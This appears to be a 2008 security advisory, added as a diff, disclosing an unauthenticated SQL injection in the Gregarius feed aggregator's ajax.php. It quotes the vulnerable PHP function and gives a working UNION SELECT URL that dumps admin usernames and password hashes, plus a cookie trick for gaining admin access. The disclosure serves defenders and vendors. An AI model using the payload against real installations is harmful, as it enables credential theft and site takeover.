@@ -1,0 +1,70 @@
+##########################################################
+# GulfTech Security Research                July 29, 2008
+##########################################################
+# Vendor : Marco Bonetti
+# URL : http://www.gregarius.net/
+# Version :  Gregarius <= 0.5.4
+# Risk : SQL Injection
+##########################################################
+
+
+Description:
+Gregarius is a popular web-based RSS/RDF/ATOM feed aggregator
+written in php. There are some SQL Injection issues in Gregarius
+that allow for the disclosure of database contents and ultimately
+the complete compromise of the Gregarius installation via exposed
+admin credentials. It is advised that Gregarius users update their
+gregarius installations as soon as possible.
+
+
+
+SQL Injection:
+Gregarius contains a number of SQL Injection issues that allow for
+an attacker to expose admin credentials with no kind of authentication
+needed. Lets have a look at the following code taken from /ajax.php
+
+
+function __exp__getFeedContent($cid) {
+    ob_start();
+    rss_require('cls/items.php');
+    
+    $readItems = new ItemList();
+
+    $readItems -> populate(" not(i.unread & ". RSS_MODE_UNREAD_STATE  .")
+    and i.cid= $cid", "", 0, 2, ITEM_SORT_HINT_READ);
+    $readItems -> setTitle(LBL_H2_RECENT_ITEMS);
+    $readItems -> setRenderOptions(IL_TITLE_NO_ESCAPE);
+    foreach ($readItems -> feeds[0] -> items as $item) {
+        $item -> render();
+    }
+    $c = ob_get_contents();
+    
+    ob_end_clean();
+    return "$cid|@|$c";
+}
+
+
+The above function is called by sajax_handle_client_request() and
+allows for an attacker to specify the content of $cid via the rsargs[]
+array. This being the case an attacker is able to influence the query
+regardless of magic_quotes_gps settings etc.
+
+/ajax.php?rs=__exp__getFeedContent&rsargs[]=-99 UNION SELECT concat(
+char(58),uname,char(58),password),2,3,4,5,6,7,8,9,0,1,2,3 FROM users/*
+
+The above query would successfully dump the users table to the browser.
+The password hashes in the database are md5 encrypted, but an attacker
+only need to md5 encrypt that password hash and place it in a cookie with the format of user|hash to gain access to the administrative controls.
+
+
+
+Solution:
+The Gregarius developers have been made aware of this issue, and users
+are encouraged to upgrade as soon as possible.
+
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
+
+# milw0rm.com [2008-07-29]
